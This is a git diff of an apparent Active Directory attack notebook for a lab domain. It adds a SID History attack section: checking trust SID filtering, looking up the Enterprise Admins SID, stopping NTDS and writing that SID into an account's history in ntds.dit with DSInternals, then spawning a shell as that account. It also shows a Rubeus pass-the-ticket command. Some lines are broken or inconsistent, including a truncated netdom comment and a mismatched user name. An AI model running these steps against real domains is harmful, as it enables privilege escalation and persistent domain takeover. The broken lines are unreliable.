@@ -116,7 +116,33 @@ dir \\UNCON-PC.warzone.oxsium.local\c$
 .\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
 ```
 
-# Configuration Naming Context Attacks
+# SID History Attack
 ```powershell
+https://www.thehacker.recipes/ad/persistence/sid-history
 
+netdom trust warzone.oxsium.local /domain:oxsium.local /quarantine
+
+// SID filtering is not enabled for this trust. All SIDs presented in an
+                     |
+          SID History Attack Potential
+
+Get-DomainGroup "Enterprise Admins" -Domain oxsium.local | select name,objectsid
+
+// DSInternals
+Import-Module DSInternals
+
+Stop-Service NTDS -Force
+Add-ADDBSidHistory `
+       -SamAccountName "warzoneadmin" `
+       -SidHistory "S-1-5-21-767238238-2156610861-601915929-519" `
+       -DBPath "C:\Windows\NTDS\ntds.dit" `
+       -Force
+Start-Service NTDS
+
+Get-ADUser attacker -Properties SIDHistory | Select SamAccountName, SIDHistory
+
+runas /user:warzoneadmin powershell.exe
+
+whoami /groups
+Unknown SID type S-1-5-21-767238238-2156610861-601915929-519  Group used for deny only
 ```
